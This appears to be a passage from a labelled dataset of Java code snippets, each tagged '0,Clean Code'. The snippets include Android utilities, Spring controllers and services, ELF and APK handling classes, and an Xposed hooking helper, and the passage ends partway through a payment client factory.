"public final class Utils {
  @ColorInt public static int getColorAccent(  Context context){
    return getColorAttr(context,android.R.attr.colorAccent);
  }
  @ColorInt public static int getTextColorPrimary(  Context context){
    return getColorAttr(context,android.R.attr.textColorPrimary);
  }
  @ColorInt public static int getTextColorSecondary(  Context context){
    return getColorAttr(context,android.R.attr.textColorSecondary);
  }
  @RequiresApi(api=Build.VERSION_CODES.M) @ColorInt public static int getDefaultColor(  Context context,  int resId){
    final ColorStateList list=context.getResources().getColorStateList(resId,context.getTheme());
    return list.getDefaultColor();
  }
  @ColorInt public static int getDisabled(  Context context,  int inputColor){
    return applyAlphaAttr(context,android.R.attr.disabledAlpha,inputColor);
  }
  @ColorInt public static int applyAlphaAttr(  Context context,  int attr,  int inputColor){
    TypedArray ta=context.obtainStyledAttributes(new int[]{attr});
    float alpha=ta.getFloat(0,0);
    ta.recycle();
    return applyAlpha(alpha,inputColor);
  }
  @ColorInt public static int applyAlpha(  float alpha,  int inputColor){
    alpha*=Color.alpha(inputColor);
    return Color.argb((int)(alpha),Color.red(inputColor),Color.green(inputColor),Color.blue(inputColor));
  }
  @ColorInt public static int getColorAttr(  Context context,  int attr){
    TypedArray ta=context.obtainStyledAttributes(new int[]{attr});
    @ColorInt int colorAccent=ta.getColor(0,0);
    ta.recycle();
    return colorAccent;
  }
  public static int getThemeAttr(  Context context,  int attr){
    TypedArray ta=context.obtainStyledAttributes(new int[]{attr});
    int theme=ta.getResourceId(0,0);
    ta.recycle();
    return theme;
  }
}
",0,Clean Code
"public class AnimeTopicPresenter extends Presenter<AnimeTopicContract.View> implements BasePresenter, AnimeTopicContract.LoadDataCallback {
  private String url;
  private int page;
  private AnimeTopicContract.View view;
  private AnimeTopicModel model;
  public AnimeTopicPresenter(  String url,  int page,  AnimeTopicContract.View view){
    super(view);
    this.url=url;
    this.view=view;
    this.page=page;
    model=new AnimeTopicModel();
  }
  @Override public void loadData(  boolean isMain){
    if (isMain) {
      view.showLoadingView();
      view.showEmptyVIew();
    }
    model.getData(url,page,isMain,this);
  }
  @Override public void success(  boolean isMain,  List<AnimeListBean> list){
    view.showSuccessView(isMain,list);
  }
  @Override public void error(  boolean isMain,  String msg){
    view.showErrorView(isMain,msg);
  }
  @Override public void pageCount(  int count){
    view.getPageCountSuccessView(count);
  }
  @Override public void error(  String msg){
  }
  @Override public void log(  String url){
    view.showLog(url);
  }
}
",0,Clean Code
"public class ElfLibraryFile implements LibraryFile {
  private final File elfFile;
  private final boolean is64Bit;
  public ElfLibraryFile(  File elfFile,  boolean is64Bit){
    this.elfFile=elfFile;
    this.is64Bit=is64Bit;
  }
  @Override public long getFileSize(){
    return elfFile.length();
  }
  @Override public String getName(){
    return elfFile.getName();
  }
  @Override public String getMapRegionName(){
    return getPath();
  }
  @Override public LibraryFile resolveLibrary(  Emulator<?> emulator,  String soName){
    File file=new File(elfFile.getParentFile(),soName);
    return file.canRead() ? new ElfLibraryFile(file,is64Bit) : null;
  }
  @Override public ByteBuffer mapBuffer() throws IOException {
    return Utils.mapBuffer(elfFile);
  }
  @Override public String getPath(){
    String name=getName();
    if (name.endsWith("".so"")) {
      return ""/system/"" + (is64Bit ? ""lib64/"" : ""lib/"") + name;
    }
 else {
      return ""/system/bin/"" + name;
    }
  }
}
",0,Clean Code
"public class SharedPreferencesUtils {
  private static final String FILE_NAME=""DiliData"";
  /** 
 * 保存数据的方法，我们需要拿到保存数据的具体类型，然后根据类型调用不同的保存方法
 * @param context
 * @param key
 * @param object
 */
  public static void setParam(  Context context,  String key,  Object object){
    String type=object.getClass().getSimpleName();
    SharedPreferences sp=context.getSharedPreferences(FILE_NAME,Context.MODE_PRIVATE);
    SharedPreferences.Editor editor=sp.edit();
    if (""String"".equals(type)) {
      editor.putString(key,(String)object);
    }
 else     if (""Integer"".equals(type)) {
      editor.putInt(key,(Integer)object);
    }
 else     if (""Boolean"".equals(type)) {
      editor.putBoolean(key,(Boolean)object);
    }
 else     if (""Float"".equals(type)) {
      editor.putFloat(key,(Float)object);
    }
 else     if (""Long"".equals(type)) {
      editor.putLong(key,(Long)object);
    }
    editor.commit();
  }
  /** 
 * 得到保存数据的方法，我们根据默认值得到保存的数据的具体类型，然后调用相对于的方法获取值
 * @param context
 * @param key
 * @param defaultObject
 * @return
 */
  public static Object getParam(  Context context,  String key,  Object defaultObject){
    String type=defaultObject.getClass().getSimpleName();
    SharedPreferences sp=context.getSharedPreferences(FILE_NAME,Context.MODE_PRIVATE);
    if (""String"".equals(type)) {
      return sp.getString(key,(String)defaultObject);
    }
 else     if (""Integer"".equals(type)) {
      return sp.getInt(key,(Integer)defaultObject);
    }
 else     if (""Boolean"".equals(type)) {
      return sp.getBoolean(key,(Boolean)defaultObject);
    }
 else     if (""Float"".equals(type)) {
      return sp.getFloat(key,(Float)defaultObject);
    }
 else     if (""Long"".equals(type)) {
      return sp.getLong(key,(Long)defaultObject);
    }
    return null;
  }
}
",0,Clean Code
"@Singleton @JdbcRunnerEnabled @Slf4j @Requires(property=""kestra.jdbc.cleaner"") public class JdbcCleaner {
  private final JooqDSLContextWrapper dslContextWrapper;
  private final Configuration configuration;
  private final JdbcCleanerService jdbcCleanerService;
  private final Table<Record> queueTable;
  @Inject public JdbcCleaner(  @Named(""queues"") JdbcTableConfig jdbcTableConfig,  JooqDSLContextWrapper dslContextWrapper,  Configuration configuration,  JdbcCleanerService jdbcCleanerService){
    this.dslContextWrapper=dslContextWrapper;
    this.configuration=configuration;
    this.jdbcCleanerService=jdbcCleanerService;
    this.queueTable=DSL.table(jdbcTableConfig.table());
  }
  public void deleteQueue(){
    ListUtils.emptyOnNull(configuration.getTypes()).forEach(type -> {
      dslContextWrapper.transaction(configuration -> {
        int deleted=DSL.using(configuration).delete(this.queueTable).where(AbstractJdbcRepository.field(""updated"").lessOrEqual(ZonedDateTime.now().minus(type.getRetention()).toOffsetDateTime())).and(jdbcCleanerService.buildTypeCondition(type.getType())).execute();
        log.info(""Cleaned {} records from {} for type {}"",deleted,this.queueTable.getName(),type.getType());
      }
);
    }
);
    dslContextWrapper.transaction(configuration -> {
      int deleted=DSL.using(configuration).delete(this.queueTable).where(AbstractJdbcRepository.field(""updated"").lessOrEqual(ZonedDateTime.now().minus(this.configuration.getRetention()).toOffsetDateTime())).execute();
      log.info(""Cleaned {} records from {}"",deleted,this.queueTable.getName());
    }
);
  }
  @Scheduled(initialDelay=""${kestra.jdbc.cleaner.initial-delay}"",fixedDelay=""${kestra.jdbc.cleaner.fixed-delay}"") public void report(){
    deleteQueue();
  }
@ConfigurationProperties(""kestra.jdbc.cleaner"") @Getter public static class Configuration {
    Duration retention;
    List<TypeConfiguration> types;
@Getter @EachProperty(value=""types"",list=true) public static class TypeConfiguration {
      String type;
      Duration retention;
    }
  }
}
",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023-01-27
 */
public interface JobService {
  /** 
 * 根据ID查询
 * @param id /
 * @return /
 */
  JobDto findById(  Long id);
  /** 
 * 创建
 * @param resources /
 * @return /
 */
  void create(  Job resources);
  /** 
 * 编辑
 * @param resources /
 */
  void update(  Job resources);
  /** 
 * 删除
 * @param ids /
 */
  void delete(  Set<Long> ids);
  /** 
 * 分页查询
 * @param criteria 条件
 * @param pageable 分页参数
 * @return /
 */
  Map<String,Object> queryAll(  JobQueryCriteria criteria,  Pageable pageable);
  /** 
 * 查询全部数据
 * @param criteria /
 * @return /
 */
  List<JobDto> queryAll(  JobQueryCriteria criteria);
  /** 
 * 导出数据
 * @param queryAll 待导出的数据
 * @param response /
 * @throws IOException /
 */
  void download(  List<JobDto> queryAll,  HttpServletResponse response) throws IOException ;
  /** 
 * 验证是否被用户关联
 * @param ids /
 */
  void verification(  Set<Long> ids);
}",0,Clean Code
"/** 
 * @author keli.wang
 * @since 2018-11-27
 */
class ConfigWatcher {
  private static final Logger LOG=LoggerFactory.getLogger(ConfigWatcher.class);
  private final CopyOnWriteArrayList<Watch> watches;
  private final ScheduledExecutorService watcherExecutor;
  ConfigWatcher(){
    this.watches=new CopyOnWriteArrayList<>();
    this.watcherExecutor=Executors.newSingleThreadScheduledExecutor(new NamedThreadFactory(""local-config-watcher""));
    start();
  }
  private void start(){
    watcherExecutor.scheduleWithFixedDelay(new Runnable(){
      @Override public void run(){
        checkAllWatches();
      }
    }
,10,10,TimeUnit.SECONDS);
  }
  private void checkAllWatches(){
    for (    Watch watch : watches) {
      try {
        checkWatch(watch);
      }
 catch (      Exception e) {
        LOG.error(""check config failed. config: {}"",watch.getConfig(),e);
      }
    }
  }
  private void checkWatch(  final Watch watch){
    final LocalDynamicConfig config=watch.getConfig();
    final long lastModified=config.getLastModified();
    if (lastModified == watch.getLastModified()) {
      return;
    }
    watch.setLastModified(lastModified);
    config.onConfigModified();
  }
  void addWatch(  final LocalDynamicConfig config){
    final Watch watch=new Watch(config);
    watch.setLastModified(config.getLastModified());
    watches.add(watch);
  }
private static final class Watch {
    private final LocalDynamicConfig config;
    private volatile long lastModified;
    private Watch(    final LocalDynamicConfig config){
      this.config=config;
    }
    public LocalDynamicConfig getConfig(){
      return config;
    }
    long getLastModified(){
      return lastModified;
    }
    void setLastModified(    final long lastModified){
      this.lastModified=lastModified;
    }
  }
}
",0,Clean Code
"/** 
 * WebSocket获取实时系统监控并输出到Web页面
 */
@Slf4j @Component @ServerEndpoint(value=""/websocket/monitor"",configurator=MyEndpointConfigure.class) public class MonitorWSServer {
  @Value(""${spring.application.name}"") private String applicationName;
  @Autowired AsyncTaskExecutor asyncTaskExecutor;
  /** 
 * 连接集合
 */
  private static Map<String,Session> sessionMap=new ConcurrentHashMap<>(3);
  /** 
 * 连接建立成功调用的方法
 */
  @OnOpen public void onOpen(  Session session){
    sessionMap.put(session.getId(),session);
    asyncTaskExecutor.submit(() -> {
      log.info(""MonitorWSServer 任务开始"");
      while (sessionMap.get(session.getId()) != null) {
        try {
          send(session,JsonUtil.stringify(SystemMonitorUtil.getSysMonitor()));
          Thread.sleep(1000);
        }
 catch (        Exception e) {
          log.error(ErrorUtil.errorInfoToString(e));
        }
      }
      log.info(""MonitorWSServer 任务结束"");
    }
);
  }
  /** 
 * 连接关闭调用的方法
 */
  @OnClose public void onClose(  Session session){
    sessionMap.remove(session.getId());
  }
  /** 
 * 发生错误时调用
 */
  @OnError public void onError(  Session session,  Throwable error){
    log.error(ErrorUtil.errorInfoToString(error));
  }
  /** 
 * 服务器接收到客户端消息时调用的方法
 */
  @OnMessage public void onMessage(  String message,  Session session){
  }
  /** 
 * 封装一个send方法，发送消息到前端
 */
  private void send(  Session session,  String message){
    try {
      session.getBasicRemote().sendText(message);
    }
 catch (    Exception e) {
      log.error(ErrorUtil.errorInfoToString(e));
    }
  }
}
",0,Clean Code
"public class ElfRelocation implements Cloneable {
  private final int objectSize;
  private final SymbolLocator symtab;
  long offset;
  long info;
  long addend;
  private final boolean android;
  ElfRelocation(  ElfParser parser,  long offset,  long entry_size,  SymbolLocator symtab){
    this.objectSize=parser.elfFile.objectSize;
    this.symtab=symtab;
    this.android=false;
    parser.seek(offset);
    if (parser.elfFile.objectSize == ElfFile.CLASS_32) {
      this.offset=parser.readInt() & 0xffffffffL;
      this.info=parser.readInt();
      this.addend=entry_size >= 12 ? parser.readInt() : 0;
    }
 else {
      this.offset=parser.readLong();
      this.info=parser.readLong();
      this.addend=entry_size >= 24 ? parser.readLong() : 0;
    }
  }
  @Override public ElfRelocation clone() throws CloneNotSupportedException {
    return (ElfRelocation)super.clone();
  }
  ElfRelocation(  int objectSize,  SymbolLocator symtab){
    this.objectSize=objectSize;
    this.symtab=symtab;
    this.android=true;
  }
  public long offset(){
    return offset;
  }
  private ElfSymbol symbol;
  public ElfSymbol symbol() throws IOException {
    if (symbol == null) {
      symbol=symtab.getELFSymbol(sym());
    }
    return symbol;
  }
  public int sym(){
    int mask=objectSize == ElfFile.CLASS_32 ? 8 : 32;
    return (int)(info >> mask);
  }
  public int type(){
    long mask=objectSize == ElfFile.CLASS_32 ? 0xff : 0xffffffffL;
    return (int)(info & mask);
  }
  public long addend(){
    return addend;
  }
  public boolean isAndroid(){
    return android;
  }
  @Override public boolean equals(  Object o){
    if (this == o)     return true;
    if (o == null || getClass() != o.getClass())     return false;
    ElfRelocation that=(ElfRelocation)o;
    return offset == that.offset && info == that.info && addend == that.addend;
  }
  @Override public int hashCode(){
    return Objects.hash(offset,info,addend);
  }
}
",0,Clean Code
"@Tag(name=""管理后台 - 菜单"") @RestController @RequestMapping(""/system/menu"") @Validated public class MenuController {
  @Resource private MenuService menuService;
  @PostMapping(""/create"") @Operation(summary=""创建菜单"") @PreAuthorize(""@ss.hasPermission('system:menu:create')"") public CommonResult<Long> createMenu(  @Valid @RequestBody MenuSaveVO createReqVO){
    Long menuId=menuService.createMenu(createReqVO);
    return success(menuId);
  }
  @PutMapping(""/update"") @Operation(summary=""修改菜单"") @PreAuthorize(""@ss.hasPermission('system:menu:update')"") public CommonResult<Boolean> updateMenu(  @Valid @RequestBody MenuSaveVO updateReqVO){
    menuService.updateMenu(updateReqVO);
    return success(true);
  }
  @DeleteMapping(""/delete"") @Operation(summary=""删除菜单"") @Parameter(name=""id"",description=""菜单编号"",required=true,example=""1024"") @PreAuthorize(""@ss.hasPermission('system:menu:delete')"") public CommonResult<Boolean> deleteMenu(  @RequestParam(""id"") Long id){
    menuService.deleteMenu(id);
    return success(true);
  }
  @GetMapping(""/list"") @Operation(summary=""获取菜单列表"",description=""用于【菜单管理】界面"") @PreAuthorize(""@ss.hasPermission('system:menu:query')"") public CommonResult<List<MenuRespVO>> getMenuList(  MenuListReqVO reqVO){
    List<MenuDO> list=menuService.getMenuList(reqVO);
    list.sort(Comparator.comparing(MenuDO::getSort));
    return success(BeanUtils.toBean(list,MenuRespVO.class));
  }
  @GetMapping({""/list-all-simple"",""simple-list""}) @Operation(summary=""获取菜单精简信息列表"",description=""只包含被开启的菜单，用于【角色分配菜单】功能的选项。"" + ""在多租户的场景下，会只返回租户所在套餐有的菜单"") public CommonResult<List<MenuSimpleRespVO>> getSimpleMenuList(){
    List<MenuDO> list=menuService.getMenuListByTenant(new MenuListReqVO().setStatus(CommonStatusEnum.ENABLE.getStatus()));
    list=menuService.filterDisableMenus(list);
    list.sort(Comparator.comparing(MenuDO::getSort));
    return success(BeanUtils.toBean(list,MenuSimpleRespVO.class));
  }
  @GetMapping(""/get"") @Operation(summary=""获取菜单信息"") @PreAuthorize(""@ss.hasPermission('system:menu:query')"") public CommonResult<MenuRespVO> getMenu(  Long id){
    MenuDO menu=menuService.getMenu(id);
    return success(BeanUtils.toBean(menu,MenuRespVO.class));
  }
}
",0,Clean Code
"public class ApkBuilder {
  private File mOutApkFile;
  private ApkPackager mApkPackager;
  private ManifestEditor mManifestEditor;
  private String mWorkspacePath;
  private String mArscPackageName;
  public ApkBuilder(  InputStream apkInputStream,  File outApkFile,  String workspacePath){
    mOutApkFile=outApkFile;
    mWorkspacePath=workspacePath;
    mApkPackager=new ApkPackager(apkInputStream,mWorkspacePath);
  }
  public ApkBuilder(  File inFile,  File outFile,  String workspacePath) throws FileNotFoundException {
    this(new FileInputStream(inFile),outFile,workspacePath);
  }
  public ApkBuilder prepare() throws IOException {
    new File(mWorkspacePath).mkdirs();
    mApkPackager.unzip();
    return this;
  }
  private File getManifestFile(){
    return new File(mWorkspacePath,""AndroidManifest.xml"");
  }
  public ManifestEditor editManifest() throws FileNotFoundException {
    mManifestEditor=new ManifestEditor(new FileInputStream(getManifestFile()));
    return mManifestEditor;
  }
  public ApkBuilder setArscPackageName(  String packageName) throws IOException {
    mArscPackageName=packageName;
    return this;
  }
  public ApkBuilder replaceFile(  String relativePath,  String newFilePath) throws IOException {
    StreamUtils.write(new FileInputStream(newFilePath),new FileOutputStream(new File(mWorkspacePath,relativePath)));
    return this;
  }
  public ApkBuilder build() throws IOException {
    if (mManifestEditor != null) {
      mManifestEditor.writeTo(new FileOutputStream(getManifestFile()));
    }
    if (mArscPackageName != null) {
      buildArsc();
    }
    return this;
  }
  private void buildArsc() throws IOException {
    File oldArsc=new File(mWorkspacePath,""resources.arsc"");
    File newArsc=new File(mWorkspacePath,""resources.arsc.new"");
    ARSCDecoder decoder=new ARSCDecoder(new BufferedInputStream(new FileInputStream(oldArsc)),null,false);
    FileOutputStream fos=new FileOutputStream(newArsc);
    decoder.CloneArsc(fos,mArscPackageName,true);
    oldArsc.delete();
    newArsc.renameTo(oldArsc);
  }
  public ApkBuilder sign() throws Exception {
    mApkPackager.repackage(mOutApkFile.getPath());
    return this;
  }
  public ApkBuilder cleanWorkspace(){
    delete(new File(mWorkspacePath));
    return this;
  }
  private void delete(  File file){
    if (file.isFile()) {
      file.delete();
      return;
    }
    for (    File child : file.listFiles()) {
      delete(child);
    }
    file.delete();
  }
}
",0,Clean Code
"/** 
 * AI 聊天消息 Service 接口
 * @author fansili
 */
public interface AiChatMessageService {
  /** 
 * 发送消息
 * @param sendReqVO 发送信息
 * @param userId 用户编号
 * @return 发送结果
 */
  AiChatMessageSendRespVO sendMessage(  AiChatMessageSendReqVO sendReqVO,  Long userId);
  /** 
 * 发送消息
 * @param sendReqVO 发送信息
 * @param userId 用户编号
 * @return 发送结果
 */
  Flux<CommonResult<AiChatMessageSendRespVO>> sendChatMessageStream(  AiChatMessageSendReqVO sendReqVO,  Long userId);
  /** 
 * 获得指定对话的消息列表
 * @param conversationId 对话编号
 * @return 消息列表
 */
  List<AiChatMessageDO> getChatMessageListByConversationId(  Long conversationId);
  /** 
 * 删除消息
 * @param id 消息编号
 * @param userId 用户编号
 */
  void deleteChatMessage(  Long id,  Long userId);
  /** 
 * 删除指定对话的消息
 * @param conversationId 对话编号
 * @param userId 用户编号
 */
  void deleteChatMessageByConversationId(  Long conversationId,  Long userId);
  /** 
 * 【管理员】删除消息
 * @param id 消息编号
 */
  void deleteChatMessageByAdmin(  Long id);
  /** 
 * 获得聊天对话的消息数量 Map
 * @param conversationIds 对话编号数组
 * @return 消息数量 Map
 */
  Map<Long,Integer> getChatMessageCountMap(  Collection<Long> conversationIds);
  /** 
 * 获得聊天消息的分页
 * @param pageReqVO 分页查询
 * @return 聊天消息的分页
 */
  PageResult<AiChatMessageDO> getChatMessagePage(  AiChatMessagePageReqVO pageReqVO);
}
",0,Clean Code
"public class WechatPushDeleteMainActivity extends ThemeActivity {
  public static void start(  Context context){
    ActivityUtils.startActivity(context,WechatPushDeleteMainActivity.class);
  }
  @Override public boolean isADVF(){
    return true;
  }
  @Override public boolean isF(){
    return true;
  }
  @Override protected void onCreate(  @Nullable Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    setContentView(R.layout.module_push_message_delegate_main);
    setSupportActionBar(findViewById(R.id.toolbar));
    showHomeAsUpNavigator();
    if (savedInstanceState == null) {
      getSupportFragmentManager().beginTransaction().replace(R.id.container,SettingsFragment.newInstance()).commit();
    }
  }
  @Override public boolean onCreateOptionsMenu(  Menu menu){
    getMenuInflater().inflate(R.menu.module_push_message_delegate_main,menu);
    return super.onCreateOptionsMenu(menu);
  }
  @Override public boolean onOptionsItemSelected(  @NonNull MenuItem item){
    if (item.getItemId() == R.id.action_gcm_diag) {
      Intent intent=new Intent();
      intent.setComponent(ComponentName.unflattenFromString(""com.google.android.gms/com.google.android.gms.gcm.GcmDiagnostics""));
      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
      startActivityChecked(intent);
      return true;
    }
    return super.onOptionsItemSelected(item);
  }
  public void startActivityChecked(  Intent intent){
    try {
      startActivity(intent);
    }
 catch (    ActivityNotFoundException e) {
    }
  }
}
",0,Clean Code
"/** 
 * Describe the need for proxy configuration.
 * @author Sebastien Deleuze
 * @see <a href=""https://www.graalvm.org/reference-manual/native-image/DynamicProxy/"">GraalVM native image dynamic proxy documentation</a>
 */
public class NativeProxyEntry {
  private final List<Class<?>> interfaceTypes;
  private final Class<?> targetClass;
  private final int proxyFeatures;
  private NativeProxyEntry(  List<Class<?>> interfaceTypes){
    this.interfaceTypes=interfaceTypes;
    this.targetClass=null;
    this.proxyFeatures=0;
  }
  private NativeProxyEntry(  Class<?> targetClass,  List<Class<?>> interfaceTypes,  int proxyFeatures){
    this.targetClass=targetClass;
    this.interfaceTypes=interfaceTypes;
    this.proxyFeatures=proxyFeatures;
  }
  /** 
 * Create a new  {@link NativeProxyEntry} for the specified interface types.
 * @param types the ordered list of interface types defining the proxy
 * @return a proxy entry
 */
  public static NativeProxyEntry ofInterfaces(  Class<?>... types){
    Assert.notNull(types,""types must not be null"");
    return new NativeProxyEntry(Arrays.asList(types));
  }
  /** 
 * Create a new  {@link NativeProxyEntry} for the specified class type.
 * @param classType the type of the class
 * @param proxyFeatures the proxy features as defined in {@link ProxyBits}
 * @param interfaceTypes the ordered list of interface types
 * @return a proxy entry
 */
  public static NativeProxyEntry ofClass(  Class<?> classType,  int proxyFeatures,  Class<?>... interfaceTypes){
    Assert.notNull(classType,""classType must not be null"");
    Assert.notNull(interfaceTypes,""interfaceTypes must not be null"");
    return new NativeProxyEntry(classType,Arrays.asList(interfaceTypes),proxyFeatures);
  }
  /** 
 * Create a new  {@link NativeProxyEntry} for the specified interface type names.
 * @param typeNames the ordered list of type names defining the proxy
 * @return a proxy entry
 */
  public static NativeProxyEntry ofInterfaceNames(  String... typeNames){
    Assert.notNull(typeNames,""typeNames must not be null"");
    List<Class<?>> types=Arrays.asList(typeNames).stream().map(typeName -> ClassUtils.resolveClassName(typeName,null)).collect(Collectors.toList());
    return new NativeProxyEntry(types);
  }
  /** 
 * Create a new  {@link NativeProxyEntry} for the specified class name.
 * @param className the type name of the class
 * @param proxyFeatures the proxy features as defined in {@link ProxyBits}
 * @param interfaceTypeNames the ordered list of interface type names
 * @return a proxy entry
 */
  public static NativeProxyEntry ofClassName(  String className,  int proxyFeatures,  String... interfaceTypeNames){
    Assert.notNull(className,""className must not be null"");
    Assert.notNull(interfaceTypeNames,""interfaceTypeNames must not be null"");
    List<Class<?>> interfaceTypes=Arrays.asList(interfaceTypeNames).stream().map(typeName -> ClassUtils.resolveClassName(typeName,null)).collect(Collectors.toList());
    return new NativeProxyEntry(ClassUtils.resolveClassName(className,null),interfaceTypes,proxyFeatures);
  }
  public void contribute(  ProxiesDescriptor descriptor){
    List<String> interfaceTypesAsString=this.interfaceTypes.stream().map(Class::getName).collect(Collectors.toList());
    if (this.targetClass == null) {
      descriptor.add(new JdkProxyDescriptor(interfaceTypesAsString));
    }
 else     descriptor.add(new AotProxyDescriptor(this.targetClass.getName(),interfaceTypesAsString,this.proxyFeatures));
  }
}
",0,Clean Code
"public static class EntitlementFieldExpr extends KaitaiStruct {
  public static EntitlementFieldExpr fromFile(  String fileName) throws IOException {
    return new EntitlementFieldExpr(new ByteBufferKaitaiStream(fileName));
  }
  public EntitlementFieldExpr(  KaitaiStream _io){
    this(_io,null,null);
  }
  public EntitlementFieldExpr(  KaitaiStream _io,  MachO.CsBlob.Expr _parent){
    this(_io,_parent,null);
  }
  public EntitlementFieldExpr(  KaitaiStream _io,  MachO.CsBlob.Expr _parent,  MachO _root){
    super(_io);
    this._parent=_parent;
    this._root=_root;
    _read();
  }
  private void _read(){
    this.data=new Data(this._io,this,_root);
    this.match=new Match(this._io,this,_root);
  }
  private Data data;
  private Match match;
  private MachO _root;
  private MachO.CsBlob.Expr _parent;
  public Data data(){
    return data;
  }
  public Match match(){
    return match;
  }
  public MachO _root(){
    return _root;
  }
  public MachO.CsBlob.Expr _parent(){
    return _parent;
  }
}
",0,Clean Code
"/** 
 * File I/O utilities.
 */
public final class FileUtils {
  private FileUtils(){
  }
  /** 
 * Reads the named file, translating  {@link IOException} to a{@link RuntimeException} of some sort.
 * @param fileName {@code non-null;} name of the file to read
 * @return {@code non-null;} contents of the file
 */
  public static byte[] readFile(  String fileName){
    File file=new File(fileName);
    return readFile(file);
  }
  /** 
 * Reads the given file, translating  {@link IOException} to a{@link RuntimeException} of some sort.
 * @param file {@code non-null;} the file to read
 * @return {@code non-null;} contents of the file
 */
  public static byte[] readFile(  File file){
    if (!file.exists()) {
      throw new RuntimeException(file + "": file not found"");
    }
    if (!file.isFile()) {
      throw new RuntimeException(file + "": not a file"");
    }
    if (!file.canRead()) {
      throw new RuntimeException(file + "": file not readable"");
    }
    long longLength=file.length();
    int length=(int)longLength;
    if (length != longLength) {
      throw new RuntimeException(file + "": file too long"");
    }
    byte[] result=new byte[length];
    try {
      FileInputStream in=new FileInputStream(file);
      int at=0;
      while (length > 0) {
        int amt=in.read(result,at,length);
        if (amt == -1) {
          throw new RuntimeException(file + "": unexpected EOF"");
        }
        at+=amt;
        length-=amt;
      }
      in.close();
    }
 catch (    IOException ex) {
      throw new RuntimeException(file + "": trouble reading"",ex);
    }
    return result;
  }
  /** 
 * Returns true if  {@code fileName} names a .zip, .jar, or .apk.
 */
  public static boolean hasArchiveSuffix(  String fileName){
    return fileName.endsWith("".zip"") || fileName.endsWith("".jar"") || fileName.endsWith("".apk"");
  }
}
",0,Clean Code
"public class TestRegistry extends DaemonRegistry {
  public TestRegistry(  Path registryFile){
    super(registryFile);
  }
  /** 
 * Kill all daemons in the registry.
 */
  public void killAll(){
    List<DaemonInfo> daemons;
    final int timeout=5000;
    final long deadline=System.currentTimeMillis() + timeout;
    while (!(daemons=getAll()).isEmpty()) {
      for (      DaemonInfo di : daemons) {
        try {
          final Optional<ProcessHandle> maybeHandle=ProcessHandle.of(di.getPid());
          if (maybeHandle.isPresent()) {
            final ProcessHandle handle=maybeHandle.get();
            final CompletableFuture<ProcessHandle> exit=handle.onExit();
            handle.destroy();
            exit.get(5,TimeUnit.SECONDS);
          }
        }
 catch (        Exception t) {
          System.out.println(""Daemon "" + di.getId() + "": ""+ t);
        }
 finally {
          remove(di.getId());
        }
      }
      if (deadline < System.currentTimeMillis() && !getAll().isEmpty()) {
        throw new RuntimeException(""Could not stop all mvnd daemons within "" + timeout + "" ms"");
      }
    }
  }
  /** 
 * Poll the state of the daemon with the given  {@code uid} until it becomes idle.
 * @param daemonId              the ID of the daemon to poll
 * @throws IllegalStateException if the daemon is not available in the registry
 * @throws AssertionError        if the timeout is exceeded
 */
  public void awaitIdle(  String daemonId){
    final int timeoutMs=5000;
    final long deadline=System.currentTimeMillis() + timeoutMs;
    while (getAll().stream().filter(di -> di.getId().equals(daemonId)).findFirst().orElseThrow(() -> new IllegalStateException(""Daemon "" + daemonId + "" is not available in the registry"")).getState() != DaemonState.Idle) {
      Assertions.assertThat(deadline).withFailMessage(""Daemon %s should have become idle within %d"",daemonId,timeoutMs).isGreaterThan(System.currentTimeMillis());
    }
  }
}
",0,Clean Code
"public class PrebuiltMethodsDeopter {
  public static void deoptMethods(  String where,  ClassLoader cl){
    String[][] callers=InlinedMethodCallers.get(where);
    if (callers == null) {
      return;
    }
    for (    String[] caller : callers) {
      try {
        Class clazz=XposedHelpers.findClassIfExists(caller[0],cl);
        if (clazz == null) {
          continue;
        }
        Object method=EdXpConfigGlobal.getHookProvider().findMethodNative(clazz,caller[1],caller[2]);
        if (method != null) {
          EdXpConfigGlobal.getHookProvider().deoptMethodNative(method);
        }
      }
 catch (      Throwable throwable) {
        Utils.logE(""error when deopting method: "" + Arrays.toString(caller),throwable);
      }
    }
  }
  public static void deoptBootMethods(){
    deoptMethods(KEY_BOOT_IMAGE,null);
    if (!TextUtils.isEmpty(Utils.getSysProp(""ro.miui.ui.version.code"")) && EdXpConfigGlobal.getConfig().isResourcesHookEnabled()) {
      deoptMethods(KEY_BOOT_IMAGE_MIUI_RES,null);
    }
  }
  public static void deoptSystemServerMethods(  ClassLoader sysCL){
    deoptMethods(KEY_SYSTEM_SERVER,sysCL);
  }
}
",0,Clean Code
"/** 
 * 多租户 JobHandler AOP 任务执行时，会按照租户逐个执行 Job 的逻辑 注意，需要保证 JobHandler 的幂等性。因为 Job 因为某个租户执行失败重试时，之前执行成功的租户也会再次执行。
 * @author 芋道源码
 */
@Aspect @RequiredArgsConstructor @Slf4j public class TenantJobAspect {
  private final TenantFrameworkService tenantFrameworkService;
  @Around(""@annotation(tenantJob)"") public void around(  ProceedingJoinPoint joinPoint,  TenantJob tenantJob){
    List<Long> tenantIds=tenantFrameworkService.getTenantIds();
    if (CollUtil.isEmpty(tenantIds)) {
      return;
    }
    Map<Long,String> results=new ConcurrentHashMap<>();
    AtomicBoolean success=new AtomicBoolean(true);
    XxlJobContext xxlJobContext=XxlJobContext.getXxlJobContext();
    tenantIds.parallelStream().forEach(tenantId -> {
      TenantUtils.execute(tenantId,() -> {
        try {
          XxlJobContext.setXxlJobContext(xxlJobContext);
          Object result=joinPoint.proceed();
          results.put(tenantId,StrUtil.toStringOrEmpty(result));
        }
 catch (        Throwable e) {
          results.put(tenantId,ExceptionUtil.getRootCauseMessage(e));
          success.set(false);
          XxlJobHelper.log(StrUtil.format(""[多租户({}) 执行任务({})，发生异常：{}]"",tenantId,joinPoint.getSignature(),ExceptionUtils.getStackTrace(e)));
        }
      }
);
    }
);
    if (success.get()) {
      XxlJobHelper.handleSuccess(JsonUtils.toJsonString(results));
    }
 else {
      XxlJobHelper.handleFail(JsonUtils.toJsonString(results));
    }
  }
}
",0,Clean Code
"/** 
 * 支付客户端的工厂实现类
 * @author 芋道源码
 */
@Slf4j public class PayClientFactoryImpl implements PayClientFactory {
  /** 
 * 支付客户端 Map key：渠道编号
 */
  private final ConcurrentMap<Long,AbstractPayClient<?>> clients=new ConcurrentHashMap<>();
  /** 
 * 支付客户端 Class Map
 */
  private final Map<PayChannelEnum,Class<?>> clientClass=new ConcurrentHashMap<>();
  public PayClientFactoryImpl(){
    clientClass.put(WX_PUB,WxPubPayClient.class);
    clientClass.put(WX_LITE,WxLitePayClient.class);
